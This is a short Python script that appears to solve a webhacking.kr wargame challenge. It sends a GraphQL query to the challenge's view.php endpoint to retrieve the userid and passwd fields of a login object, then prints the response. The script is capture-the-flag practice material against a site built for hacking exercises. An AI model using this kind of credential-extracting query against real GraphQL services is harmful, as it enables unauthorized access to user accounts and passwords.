import requests

url="http://webhacking.kr:10012/view.php?"

def solve(): # GraphQL
    payload="query={+login_51b48f6f7e6947fba0a88a7147d54152+{+userid_a7fce99fa52d173843130a9620a787ce,passwd_e31db968948082b92e60411dd15a25cd+}+}"
    res = requests.get(url=url+payload)
    print(res.text)

if __name__ == "__main__":
    solve()